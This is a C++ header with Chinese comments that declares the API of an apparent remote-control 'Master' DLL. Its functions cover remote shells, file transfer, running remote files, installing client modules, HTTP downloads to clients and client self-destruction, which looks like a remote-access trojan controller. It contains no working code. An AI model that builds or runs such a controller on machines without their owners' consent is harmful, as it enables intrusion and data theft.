#pragma once
// 下列 ifdef 块是创建使从 DLL 导出更简单的
// 宏的标准方法。此 DLL 中的所有文件都是用命令行上定义的 MASTER_EXPORTS
// 符号编译的。在使用此 DLL 的
// 任何其他项目上不应定义此符号。这样，源文件中包含此文件的任何其他项目都会将
// MASTER2_API 函数视为是从 DLL 导入的，而此 DLL 则将用此宏定义的
// 符号视为是被导出的。
#ifdef MASTER2_EXPORTS
#define MASTER2_API extern "C" __declspec(dllexport)
#else
#define MASTER2_API extern "C" __declspec(dllimport)
#endif

#include "ArrayData.h"
#include "BaseType.h"
#include "ClientInfoCallbacks.h"
#include "MessageDefines.h"
#include "CommCallback.h"
#include "CmdShellData.h"
#include "MasterError.h"
#include "FileTransferData.h"


//Shell相关接口
MASTER2_API BOOL OpenShell(LPCWSTR clientid, FnRemoteCmdOutput fnRemoteCmdOutput, LPVOID lpParameter);

MASTER2_API BOOL ExecuteShellCommand(LPCWSTR clientid, LPCWSTR cmdline, BOOL bAddRN = TRUE);

MASTER2_API void CloseShell(LPCWSTR clientid);

//文件管理相关接口

MASTER2_API BOOL PutFileToClient(LPCTSTR clientid,LPCTSTR serverpath,LPCTSTR clientpath);

MASTER2_API BOOL GetFileToServer(LPCTSTR clientid,LPCTSTR clientpath,LPCTSTR serverpath);

MASTER2_API BOOL StopFileTransfer( LPCTSTR clientid ,TRANS_STATUS& status );

MASTER2_API BOOL StartFileTransfer( LPCTSTR clientid ,TRANS_STATUS& status );

MASTER2_API BOOL DeleteFileTransfer( LPCTSTR clientid ,TRANS_STATUS& status );

MASTER2_API BOOL IsHasStop ( LPCTSTR clientid ,TRANS_STATUS& status );


typedef void (*FnQueryTrans)(LPCTSTR clientid,TRANS_STATUS status,LPVOID lpParameter);
MASTER2_API void QueryTransferStatus(LPCTSTR clientid,FnQueryTrans fn,LPVOID lpParameter);

MASTER2_API void DeleteRemoteFile(LPCTSTR clientid,LPCTSTR clientpath);

MASTER2_API void RunRemoteFile(LPCTSTR clientid,LPCTSTR clientpath);

//文件浏览相关接口
MASTER2_API void AsynListFiles( LPCTSTR clientid, LPCTSTR findstr,BOOL isClient, FnModuleNotifyProc callback ,LPVOID lpParameter);

MASTER2_API void AsynListDisks( LPCWSTR clientid,BOOL isClient, FnModuleNotifyProc callback , LPVOID lpParameter );

//启动Master
MASTER2_API BOOL StartMasterWorking();

//根据消息序列号，查询客户端的应答消息
MASTER2_API BOOL GetReplyByMsgserialid(LPCTSTR clientid, MSGSERIALID sendMsgserialid, ByteList* pByteList);

//查询正在发送消息的状态
MASTER2_API BOOL QuerySendingMessageStatus(LPCTSTR clientid, MSGSERIALID sendMsgserialid, DWORD* pdwSentBytes, DWORD* pdwTotalBytes);

//查询正在接受消息的状态
MASTER2_API BOOL QueryReceivingFileStatus(LPCTSTR clientid, MSGSERIALID receivingMsgserialid, DWORD* pdwRecvBytes, DWORD* pdwTotalBytes);

//设置客户端信息变更回调通知函数
MASTER2_API void SetClientInfoNotifies(FnNotifyProc fnNotify, LPVOID lpParameter);

//获取最近的一条错误编号
MASTER2_API DWORD GetMasterLastError();

//获取错误编号对应的描述信息
MASTER2_API LPCTSTR GetMasterErrorMsg(DWORD dwLastError);

//查询当前可用的客户端id列表
MASTER2_API void ListAvailableClients(MyStringList* pClientidList);

//向客户端中安装模块
MASTER2_API BOOL InstallClientModule(LPCTSTR clientid, LPCTSTR moduleName);

//添加监听服务
MASTER2_API int AddCommService(int port,int name);

//删除监听服务
MASTER2_API BOOL DeleteCommService(int serialid);

//查询服务端上可用的模块列表
MASTER2_API void ListAvailableClientModules(MyStringList* pModulenameList);

//让客户端自毁
MASTER2_API BOOL MakeClientSelfDestruction(LPCTSTR clientid);

//获取客户端的基础信息
MASTER2_API BOOL GetClientInfo(LPCTSTR clientid, CLIENT_INFO* clientBaseInfo);

//关闭MASTER
MASTER2_API void StopMasterWorking();

//修改Packet状态
MASTER2_API BOOL ModifyPacketStatus(ULONG serial,LPCTSTR clientid,BOOL status);

//使用HTTP下载文件
MASTER2_API void HttpDownLoad(LPCTSTR clientid,LPCTSTR url,LPCTSTR path);